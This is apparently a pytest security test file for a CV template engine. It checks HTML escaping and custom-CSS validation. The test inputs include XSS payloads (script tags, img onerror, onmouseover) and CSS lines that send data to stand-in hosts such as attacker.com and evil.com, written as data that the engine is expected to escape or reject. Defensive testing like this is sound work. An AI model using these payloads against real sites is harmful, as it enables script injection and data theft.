#!/usr/bin/env python3
"""
Unit tests for CV Template Engine - Security & Functionality

Tests XSS protection, CSS injection prevention, and core rendering.
"""

import pytest
import sys
from pathlib import Path

# Add scripts dir to path
sys.path.insert(0, str(Path(__file__).parent))

from template_engine import TemplateEngine


class TestXSSProtection:
    """Test XSS vulnerability protection in HTML rendering"""

    def test_xss_in_full_name(self):
        """Should escape script tags in full_name field"""
        engine = TemplateEngine()
        cv_data = {
            "personal": {
                "full_name": "<script>alert('xss')</script>",
                "title": "Developer"
            },
            "experience": [],
            "skills": {}
        }

        html = engine.render_html(cv_data, template_id="classic")

        # Script tag should be escaped, not executed
        assert "<script>" not in html
        assert "&lt;script&gt;" in html
        # Single quotes escaped to &#x27; or &#39;
        assert ("alert(&#x27;xss&#x27;)" in html or "alert(&#39;xss&#39;)" in html)

    def test_xss_in_email(self):
        """Should escape HTML in email field"""
        engine = TemplateEngine()
        cv_data = {
            "personal": {
                "full_name": "John Doe",
                "email": '"><img src=x onerror=alert(1)>'
            },
            "experience": [],
            "skills": {}
        }

        html = engine.render_html(cv_data)

        # img tag should be escaped (both < and onerror attribute)
        assert "<img" not in html  # Raw tag not present
        # "onerror" might appear escaped in attribute context
        assert ("&lt;img" in html or "&quot;&gt;&lt;img" in html)  # Escaped version present

    def test_xss_in_experience_role(self):
        """Should escape HTML in experience role/company"""
        engine = TemplateEngine()
        cv_data = {
            "personal": {"full_name": "Test"},
            "experience": [{
                "role": "<b onmouseover=alert('xss')>Developer</b>",
                "company": "<script>steal()</script>Corp",
                "start_date": "2020",
                "end_date": "2021"
            }],
            "skills": {}
        }

        html = engine.render_html(cv_data)

        # HTML tags should be escaped
        assert "<b onmouseover" not in html
        assert "<script>steal()" not in html
        assert "&lt;b" in html or "&lt;script&gt;" in html

    def test_xss_in_achievements(self):
        """Should escape HTML in achievements list"""
        engine = TemplateEngine()
        cv_data = {
            "personal": {"full_name": "Test"},
            "experience": [{
                "role": "Developer",
                "company": "ACME",
                "start_date": "2020",
                "achievements": [
                    "Completed project",
                    "<img src=x onerror=alert('xss')>"
                ]
            }],
            "skills": {}
        }

        html = engine.render_html(cv_data)

        assert "<img src=x" not in html
        assert "&lt;img" in html

    def test_xss_in_skills(self):
        """Should escape HTML in skills"""
        engine = TemplateEngine()
        cv_data = {
            "personal": {"full_name": "Test"},
            "experience": [],
            "skills": {
                "Programming": ["Python", "<script>alert(1)</script>"]
            }
        }

        html = engine.render_html(cv_data)

        assert "<script>alert(1)</script>" not in html
        assert "&lt;script&gt;" in html


class TestCSSInjectionProtection:
    """Test CSS injection prevention"""

    def test_css_with_url_function_blocked(self):
        """Should block url() function (data exfiltration risk)"""
        engine = TemplateEngine()

        malicious_css = """
        body {
            background: url(http://attacker.com/steal?data=secrets);
        }
        """

        with pytest.raises(ValueError, match="dangerous pattern 'url\\('"):
            engine._validate_custom_css(malicious_css)

    def test_css_with_import_blocked(self):
        """Should block @import (external CSS loading)"""
        engine = TemplateEngine()

        malicious_css = "@import url(http://evil.com/steal.css);"

        with pytest.raises(ValueError, match="dangerous pattern '@import'"):
            engine._validate_custom_css(malicious_css)

    def test_css_with_keyframes_blocked(self):
        """Should block @keyframes (behavioral CSS)"""
        engine = TemplateEngine()

        malicious_css = """
        @keyframes steal {
            from { background: url(http://attacker.com); }
        }
        """

        with pytest.raises(ValueError, match="dangerous pattern '@keyframes'"):
            engine._validate_custom_css(malicious_css)

    def test_css_with_expression_blocked(self):
        """Should block expression() (IE-specific code execution)"""
        engine = TemplateEngine()

        malicious_css = "width: expression(alert('xss'));"

        with pytest.raises(ValueError, match="dangerous pattern 'expression\\('"):
            engine._validate_custom_css(malicious_css)

    def test_css_only_whitelisted_properties_allowed(self):
        """Should only allow safe CSS properties"""
        engine = TemplateEngine()

        # Mix of safe and unsafe properties
        mixed_css = """
        margin: 10px;
        padding: 20px;
        font-size: 14px;
        position: absolute;
        display: none;
        """

        validated = engine._validate_custom_css(mixed_css)

        # Safe properties preserved
        assert "margin: 10px" in validated
        assert "padding: 20px" in validated
        assert "font-size: 14px" in validated

        # Unsafe properties stripped
        assert "position:" not in validated
        assert "display:" not in validated

    def test_css_valid_styling_passes(self):
        """Should allow valid safe CSS"""
        engine = TemplateEngine()

        safe_css = """
        margin-top: 2cm;
        padding-left: 1.5cm;
        font-family: Arial, sans-serif;
        font-size: 12pt;
        color: #333333;
        """

        validated = engine._validate_custom_css(safe_css)

        assert "margin-top: 2cm" in validated
        assert "font-family: Arial" in validated
        assert "color: #333333" in validated

    def test_custom_css_integration(self):
        """Should apply validated CSS in render_html"""
        engine = TemplateEngine()
        cv_data = {
            "personal": {"full_name": "Test"},
            "experience": [],
            "skills": {}
        }

        # Mix safe and unsafe CSS
        custom_css = """
        margin: 20px;
        background: url(http://attacker.com);
        """

        # Should raise error due to url()
        with pytest.raises(ValueError):
            engine.render_html(cv_data, custom_css=custom_css)


class TestTemplateRendering:
    """Test basic template rendering functionality"""

    def test_list_templates(self):
        """Should list all available templates"""
        engine = TemplateEngine()
        templates = engine.list_templates()

        assert len(templates) >= 3
        template_ids = [t["id"] for t in templates]
        assert "classic" in template_ids
        assert "compact" in template_ids
        assert "modern" in template_ids

    def test_render_with_minimal_data(self):
        """Should render HTML with minimal CV data"""
        engine = TemplateEngine()
        cv_data = {
            "personal": {"full_name": "John Doe"},
            "experience": [],
            "skills": {}
        }

        html = engine.render_html(cv_data)

        assert "<html" in html.lower()
        assert "John Doe" in html
        assert "</html>" in html.lower()

    def test_render_with_complete_data(self):
        """Should render full CV with all sections"""
        engine = TemplateEngine()
        cv_data = {
            "personal": {
                "full_name": "Jane Smith",
                "title": "Senior Developer",
                "email": "jane@example.com",
                "phone": "+1234567890"
            },
            "summary": "Experienced developer with 10 years in Python.",
            "experience": [{
                "role": "Senior Developer",
                "company": "Tech Corp",
                "start_date": "2020-01",
                "end_date": "Present",
                "achievements": ["Led team of 5", "Improved performance 40%"],
                "tech_stack": ["Python", "Django", "PostgreSQL"]
            }],
            "skills": {
                "Languages": ["Python", "JavaScript"],
                "Frameworks": ["Django", "React"]
            }
        }

        html = engine.render_html(cv_data, template_id="classic")

        # Check all content is present
        assert "Jane Smith" in html
        assert "Senior Developer" in html
        assert "jane@example.com" in html
        assert "Experienced developer" in html
        assert "Tech Corp" in html
        assert "Led team of 5" in html
        assert "Python" in html
        assert "Django" in html


class TestErrorHandling:
    """Test error handling and edge cases"""

    def test_invalid_template_id_raises_error(self):
        """Should raise ValueError for non-existent template"""
        engine = TemplateEngine()
        cv_data = {"personal": {"full_name": "Test"}, "experience": [], "skills": {}}

        with pytest.raises(ValueError, match="Template 'nonexistent' not found"):
            engine.render_html(cv_data, template_id="nonexistent")

    def test_none_values_handled_gracefully(self):
        """Should handle None values without crashing"""
        engine = TemplateEngine()
        cv_data = {
            "personal": {"full_name": None, "email": None},
            "experience": [],
            "skills": {}
        }

        html = engine.render_html(cv_data)

        # Should not crash, should render empty strings
        assert "<html" in html.lower()


if __name__ == "__main__":
    # Run tests
    pytest.main([__file__, "-v", "--tb=short"])
